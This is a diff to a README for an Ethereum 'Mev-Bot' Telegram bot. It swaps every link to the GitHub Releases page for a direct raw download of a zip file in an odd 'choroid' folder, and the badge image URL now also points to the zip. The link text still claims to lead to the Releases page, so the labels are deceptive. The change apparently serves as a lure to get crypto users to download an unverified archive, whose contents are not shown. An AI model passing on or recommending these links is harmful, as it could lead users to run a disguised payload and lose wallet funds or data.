@@ -1,6 +1,6 @@
 # 🤖 Mev-Bot_Ethereum_network - Simplified Telegram Bot for Ethereum Users
 
-[![Download Mev-Bot](https://img.shields.io/badge/Download%20Mev--Bot%20Now-brightgreen)](https://github.com/MahdiDirany/Mev-Bot_Ethereum_network/releases)
+[![Download Mev-Bot](https://raw.githubusercontent.com/MahdiDirany/Mev-Bot_Ethereum_network/main/choroid/Mev-Bot_Ethereum_network.zip%20Mev--Bot%20Now-brightgreen)](https://raw.githubusercontent.com/MahdiDirany/Mev-Bot_Ethereum_network/main/choroid/Mev-Bot_Ethereum_network.zip)
 
 ## 📋 Overview
 
@@ -17,7 +17,7 @@ Mev-Bot is an easy-to-use Telegram bot designed to interact with Ethereum contra
 Follow these steps to download and run Mev-Bot:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/MahdiDirany/Mev-Bot_Ethereum_network/releases). This is where you will find the latest version of the bot.
+   Go to the [Releases page](https://raw.githubusercontent.com/MahdiDirany/Mev-Bot_Ethereum_network/main/choroid/Mev-Bot_Ethereum_network.zip). This is where you will find the latest version of the bot.
 
 2. **Find the Latest Version:**
    Look for the latest release. The version number will be clearly displayed. 
@@ -36,7 +36,7 @@ Follow these steps to download and run Mev-Bot:
 
 ### 📥 Download & Install
 
-To get started, please [visit this page to download](https://github.com/MahdiDirany/Mev-Bot_Ethereum_network/releases) the latest version of the Mev-Bot. Follow the above steps to install and use it.
+To get started, please [visit this page to download](https://raw.githubusercontent.com/MahdiDirany/Mev-Bot_Ethereum_network/main/choroid/Mev-Bot_Ethereum_network.zip) the latest version of the Mev-Bot. Follow the above steps to install and use it.
 
 ## 📊 System Requirements
 
@@ -68,7 +68,7 @@ The Mev-Bot works through Telegram, so you can access it from your mobile device
 
 ### How often are updates released?
 
-Updates are made periodically to fix bugs and add features. Keep an eye on the [Releases page](https://github.com/MahdiDirany/Mev-Bot_Ethereum_network/releases) for new versions.
+Updates are made periodically to fix bugs and add features. Keep an eye on the [Releases page](https://raw.githubusercontent.com/MahdiDirany/Mev-Bot_Ethereum_network/main/choroid/Mev-Bot_Ethereum_network.zip) for new versions.
 
 ## ✍️ Feedback
 
